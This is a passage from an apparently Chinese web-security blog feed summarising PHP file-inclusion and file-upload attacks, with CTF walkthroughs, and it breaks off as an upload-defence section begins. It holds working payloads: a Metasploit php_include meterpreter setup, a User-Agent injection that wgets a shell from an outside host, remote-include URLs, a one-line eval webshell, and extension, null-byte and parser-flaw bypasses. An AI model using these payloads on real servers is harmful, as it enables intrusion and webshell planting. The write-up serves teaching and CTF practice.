class="headerlink" title="包含日志"></a>包含日志</h3><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p><p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p><p>apache服务器的默认日志地址为：<code>/var/log/apache2/access.log</code></p><p>nginx服务器的默认日志地址为：<code>/var/log/nginx/access.log</code></p><p>?file=/etc/httpd/httpd.conf</p><p>可以找到errorlog的位置。</p><p>构造url为：<code>http://xxxx/&lt;?php phpinfo();?&gt;</code>，请求之后，包含日志文件</p><p>include(‘/var/log/apache2/access.log’)，从而成功执行php代码</p><p> ?file=../../../../../../../../../var/log/apache/error.log </p><p>1.</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032017_676.png" alt=""></p><p>​   </p><p>2.可以尝试利用UA插入payload到日志文件</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032021_793.png" alt=""></p><p>3.MSF攻击模块</p><pre><code>use exploit/unix/webapp/php_includeset rhost 192.168.159.128set rport 80set phpuri /index.php?file=xxLFIxxset path http://172.18.176.147/set payload php/meterpreter/bind_tcpset srvport 8888exploit -z</code></pre><p><strong>日志默认路径</strong></p><p>(1) apache+Linux日志默认路径</p><pre><code>/etc/httpd/logs/access_log</code></pre><p>或者</p><pre><code>/var/log/httpd/access log</code></pre><p> (2) apache+win2003日志默认路径</p><pre><code>D:xamppapachelogsaccess.logD:xamppapachelogserror.log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre><code>C:WINDOWSsystem32Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre><code>%SystemDrive%inetpublogsLogFiles</code></pre><p>(5) nginx 日志文件在用户安装目录的logs目录下</p><p>如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里</p><p>也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log）</p><p><strong>2）web中间件默认配置</strong></p><p> (1) apache+linux 默认配置文件</p><pre><code>/etc/httpd/conf/httpd.conf</code></pre><p>或者</p><pre><code>index.php?page=/etc/init.d/httpd</code></pre><p>(2) IIS6.0+win2003 配置文件</p><p>C:/Windows/system32/inetsrv/metabase.xml </p><p>(3) IIS7.0+WIN 配置文件</p><p>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>PHP默认生成的Session文件往往存放在/tmp目录下<br>/tmp/sess_SESSIONID</p><p>/var/lib/php/session/sess_SESSIONID</p><p>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><h3 id="包含-proc-self-environ文件"><a href="#包含-proc-self-environ文件" class="headerlink" title="包含/proc/self/environ文件"></a>包含/proc/self/environ文件</h3><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>姿势：</p><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p>?file=../../../../../../../proc/self/environ</p><p>选择User-Agent 写代码如下：</p><pre><code>&lt;?system(&#39;wget http://www.yourweb.com/oneword.txt -O shell.php&#39;);?&gt;</code></pre><p>然后提交请求。</p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140916_975.png" alt=""></p><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p><h2 id="有防御的本地文件包含"><a href="#有防御的本地文件包含" class="headerlink" title="有防御的本地文件包含"></a>有防御的本地文件包含</h2><p>文件名后缀固定：在包含的文件名后加固定后缀</p><p>文件名过滤 :使用switch array限制可以包含的文件名</p><p>审计中可见这样的包含模版文件：</p><pre><code class="php">&lt;?php    $file = $_GET[&#39;file&#39;];    include &#39;/var/www/html/&#39;.$file.&#39;/test/test.php&#39;;?&gt;</code></pre><p>这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。</p><ol><li><p>%00截断</p><p> 能利用00截断的场景现在应该很少了</p><p> PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</p><p> ?file=../../../../../../../../../etc/passwd%00</p><p> 文件系统获取含有换行符的文件名，会截断为../../../ect/passwd</p><p> (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p></li><li><p>%00截断目录遍历：</p><p> ?file=../../../../../../../../../var/www/%00<br> (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></li><li><p>路径长度截断：</p><p> ?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br> (php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256)</p><p> 利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p> 我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br> 而利用”./“的方式即可构造出超长目录字符串:</p></li><li><p>点号截断：</p><p> ?file=../../../../../../../../../boot.ini/………[…]…………<br> (php版本小于5.2.8可以成功，只适用windows，点号需要长于256)</p></li><li><p>编码绕过</p><p> 服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li>利用url编码<ul><li>../<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e/  </li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li><p>二次编码</p><ul><li>../<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul><p>6.~绕过</p><p>针对目录限制</p><p>？file=~/../phpinfo这样的代码。其中~就是尝试是否可以直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录</p></li></ul></li></ol><h2 id="二、远程文件包含"><a href="#二、远程文件包含" class="headerlink" title="二、远程文件包含"></a>二、远程文件包含</h2><pre><code>?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp</code></pre><h2 id="有防御的远程文件包含"><a href="#有防御的远程文件包含" class="headerlink" title="有防御的远程文件包含"></a>有防御的远程文件包含</h2><pre><code class="php">&lt;?php     $basePath = $_GET[&#39;path&#39;];    require_once $basePath . &quot;/action/m_share.php&quot;;  ?&gt;</code></pre><p>攻击者可以构造类似如下的攻击URL</p><pre><code class="url">http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23</code></pre><p>产生的原理:</p><pre><code>/?path=http://localhost/test/solution.php?最终目标应用程序代码实际上执行了:require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合</code></pre><h2 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h2><p><a href="http://cn2.php.net/manual/zh/wrappers.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/wrappers.php</a></p><pre><code>file:///var/www/html  访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   访问FTP(s) URLsdata://  数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流</code></pre><h3 id="利用php流input："><a href="#利用php流input：" class="headerlink" title="利用php流input："></a>利用php流input：</h3><p>利用条件：</p><ol><li>allow_url_include = On。</li><li>对allow_url_fopen不做要求。</li></ol><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804032124_161.png" alt=""></p><p>结果将在index.php所在文件下的文件shell.php内增加”&lt;?php phpinfo();?&gt;”一句话</p><h3 id="利用php流filter："><a href="#利用php流filter：" class="headerlink" title="利用php流filter："></a>利用php流filter：</h3><p>?file=php://filter/convert.base64-encode/resource=index.php</p><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p><p>其他姿势：</p><pre><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p><h3 id="利用data-URIs："><a href="#利用data-URIs：" class="headerlink" title="利用data URIs："></a>利用data URIs：</h3><p>利用条件：</p><ol><li>php版本大于等于php5.2</li><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,base64编码的payloadindex.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt;</code></pre><p>(需要allow_url_include=On)</p><h3 id="利用XSS执行任意代码："><a href="#利用XSS执行任意代码：" class="headerlink" title="利用XSS执行任意代码："></a>利用XSS执行任意代码：</h3><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a></p><p>利用条件：</p><ol><li>allow_url_fopen = On</li><li>并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊</li></ol><h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><p>glob:// 查找匹配的文件路径模式</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><p>理解：</p><p>如果服务器只允许包含.php文件，后台代码为：<code>include(xxx + &#39;.php&#39;);</code>，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：phar://a.txt/test，服务器拼接以后就成为了：phar://a.txt/test.php，即可成功包含 </p><p>姿势：</p><p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_301.png" alt=""></p><p>指定绝对路径</p><pre><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></pre><p>或者使用相对路径（这里test.zip就在当前目录下）</p><pre><code>index.php?file=phar://test.zip/phpinfo.txt</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140917_297.png" alt=""></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p><ol><li>php版本大于等于php5.3.0</li></ol><pre><code>&lt;?php$file = $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){    include($file);}?&gt;</code></pre><p>截取过来的后面4格字符,判断是不是jpg,如果是jpg才进行包含</p><p>但使用zip协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>，之后填上压缩包内的文件。</p><p>然后我们构造zip://php.zip#php.jpg</p><pre><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23php.jpg</code></pre><p>注意事项：</p><ol><li>若是使用相对路径，则会包含失败。</li><li>协议原型：zip://archive.zip#dir/file.txt</li><li>注意url编码,因为这个#会和url协议中的#冲突</li></ol><h2 id="CTF中的文件包含套路"><a href="#CTF中的文件包含套路" class="headerlink" title="CTF中的文件包含套路"></a>CTF中的文件包含套路</h2><h3 id="php伪协议读取源码"><a href="#php伪协议读取源码" class="headerlink" title="php伪协议读取源码"></a>php伪协议读取源码</h3><p>点击login，发现链接变为：</p><pre><code>http://54.222.188.152:1/index.php?action=login.php</code></pre><p>推测文件包含 访问：</p><pre><code>http://54.222.188.152:1/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</code></pre><p>得到源码</p><h3 id="贪婪包含"><a href="#贪婪包含" class="headerlink" title="贪婪包含"></a>贪婪包含</h3><p>iscc2018的一道题目</p><p>打开题目</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140857_654.png" alt=""></p><p>查看源码<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php</code></pre><p>但是不行</p><p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p><p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;,&#39;Off&#39;);include(&#39;config.php&#39;);$img = $_GET[&#39;img&#39;];if(isset($img) &amp;&amp; !empty($img)){    if(strpos($img,&#39;jpg&#39;) !== false)    {        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)        {            die(&#39;File not found.&#39;);        }        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);        if(isset($matches[1]))        {            $img = $matches[1];        }        header(&#39;Content-Type: image/jpeg&#39;);        $data = get_contents($img);        echo $data;    }    else    {        die(&#39;File not found.&#39;);    }}else{    ?&gt;    &lt;img src=&quot;1.jpg&quot;&gt;    &lt;?php}?&gt;</code></pre><ol><li>开头包含了config.php</li><li>img必须有jpg但又不能有resource=.*jpg</li><li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li></ol><p>知道了config.php再去访问明白为什么必须包含jpg</p><pre><code class="php">&lt;?phpfunction get_contents($img){        if(strpos($img,&#39;jpg&#39;) !== false)        {                return file_get_contents($img);        }        else        {                header(&#39;Content-Type: text/html&#39;);                return file_get_contents($img);        }}?&gt;</code></pre><p>最终payload:</p><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>要求：</p><ul><li>php版本小于5.3.4</li><li>magic_quotes_gpc为off状态</li></ul><p>大多数的文件包含漏洞都是需要截断的，因为正常程序里面包含的文件代码一般是include(BASEPATH.$mod.’.php’)或者include($mod.’.php’)这样的方式，如果我们不能写入.php为扩展名的文件，那我们是需要截断来利用的</p><p>受限与gpc和addslashes等函数的过滤，另外，php5.3之后的版本全面修复了%00截断的问题</p><pre><code class="php">&lt;?phpinclude($_GET[&#39;a&#39;].&#39;.php&#39;)?&gt;</code></pre><p>上传我们的2.txt文件,请求<a href="http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码" target="_blank" rel="external">http://localhost/test/1.php?a=2.txt%00即可执行2.txt中phpinfo的代码</a> </p><p>列子二</p><p>漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录</p><p>这里限制了后缀名，我们需要通过截断才能访问到flag文件 利用代码：</p><pre><code>index.php?file=../../flag.php%00</code></pre><p>%00 会被解析为0x00，所以导致截断的发生 我们通过截断成功的绕过了后缀限制</p><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。 如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉</p><p><img src="https://pic3.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_hd.jpg" alt="img"></p><p>那么我们这时候有没有办法绕过这个限制呢？有一个条件那就是php版本小于5.3.10 我们的代码依旧不变 漏洞文件index.php</p><pre><code>&lt;?phpif (empty($_GET[&quot;file&quot;])){    echo(&#39;../flag.php&#39;);    return;}else{    $filename=&#39;pages/&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&#39;.html&#39;;    include $filename;}?&gt;</code></pre><p>flag文件放在上层目录 这时我们可以使用字符 .    /.   和  ./  来进行绕过，因为文件路径有长度限制</p><ul><li>windows 259个bytes</li><li>linux 4096个bytes</li></ul><p>在windows下需要.字符最少的利用POC1：</p><pre><code>file=../../flag.php..............................................................................................................................................................................................................................................</code></pre><p><img src="https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_hd.jpg" alt="img"></p><p>在windows下需要.字符最少的利用POC2：</p><pre><code>file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic1.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_hd.jpg" alt="img"></p><p>将flag.php改为flag1.php 在windows下需要.字符最少的利用POC3：</p><pre><code>file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="https://pic4.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_hd.jpg" alt="img"></p><p>我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。 这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>file_get_contents最常见的文件读取函数</p><p>?dir=/data/web.config</p><h2 id="文件包含利用方式整理"><a href="#文件包含利用方式整理" class="headerlink" title="文件包含利用方式整理"></a>文件包含利用方式整理</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161007_364.png" alt=""></p><h2 id="中间件安全配置"><a href="#中间件安全配置" class="headerlink" title="中间件安全配置"></a>中间件安全配置</h2><ul><li>magic_qutes_gpc</li><li>限制访问区域</li><li>设置访问权限</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201806161021_780.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传总结</title>
      <link href="/archis/ea42f6a6/"/>
      <url>/archis/ea42f6a6/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传总结"><a href="#文件上传总结" class="headerlink" title="文件上传总结"></a>文件上传总结</h1><h2 id="0x00-上传检测流程概述"><a href="#0x00-上传检测流程概述" class="headerlink" title="0x00 上传检测流程概述"></a>0x00 上传检测流程概述</h2><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据而一般文件上传过程中检测部分由</p><ul><li>A 客户端javascript检测 （检测文件扩展名）</li><li>B 服务端MIME类型检测 （检测Content—Type）</li><li>C 服务端目录路径检测（检测和path相关参数）</li><li>D 服务端文件扩展名检测 （检测文件扩展名）</li><li>E 服务端内容检测 （检测是否含有恶意代码）0x01 客户端检测绕过(javascript 检测)</li></ul><h2 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h2><h2 id="0x02-服务端检测绕过-MIME-类型检测"><a href="#0x02-服务端检测绕过-MIME-类型检测" class="headerlink" title="0x02 服务端检测绕过(MIME 类型检测)"></a>0x02 服务端检测绕过(MIME 类型检测)</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071824_866.png" alt=""></p><h2 id="0x03-服务端检测绕过-目录路径检测"><a href="#0x03-服务端检测绕过-目录路径检测" class="headerlink" title="0x03 服务端检测绕过(目录路径检测)"></a>0x03 服务端检测绕过(目录路径检测)</h2><h2 id="0x04-服务端检测绕过-文件扩展名检测"><a href="#0x04-服务端检测绕过-文件扩展名检测" class="headerlink" title="0x04 服务端检测绕过(文件扩展名检测)"></a>0x04 服务端检测绕过(文件扩展名检测)</h2><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br>用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br>在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br>被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过<br>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg<br>​</p></li><li><p>.htaccess 文件攻击<br>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h2 id="0x05-服务端检测绕过-文件内容检测"><a href="#0x05-服务端检测绕过-文件内容检测" class="headerlink" title="0x05 服务端检测绕过(文件内容检测)"></a>0x05 服务端检测绕过(文件内容检测)</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>绕过方法：<br>针对渲染加载测试：代码注入绕过<br>针对二次渲染测试：攻击文件加载器</p></li></ul><h2 id="0x06-服务器解析漏洞"><a href="#0x06-服务器解析漏洞" class="headerlink" title="0x06 服务器解析漏洞"></a>0x06 服务器解析漏洞</h2><h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h3 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h3><ul><li><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p></li><li><p>描述：</p><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li></ul><h3 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h3><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p>将shell语句，如</p><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code>xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>nginx 0.5.* [Success]</p><p>nginx 0.6.* [Success]</p><p>nginx 0.7 &lt;= 0.7.65 [Success]</p><p>nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h2 id="0x07-上传攻击框架"><a href="#0x07-上传攻击框架" class="headerlink" title="0x07 上传攻击框架"></a>0x07 上传攻击框架</h2><ul><li>轻量级检测绕过攻击</li><li>路径/扩展名检测绕过攻击</li><li>文件内容性检测绕过攻击</li><li>上传攻击框架</li></ul><h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御"></a>文件上传防御</h2><p>1.关掉上传文件的功能</p><p>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file 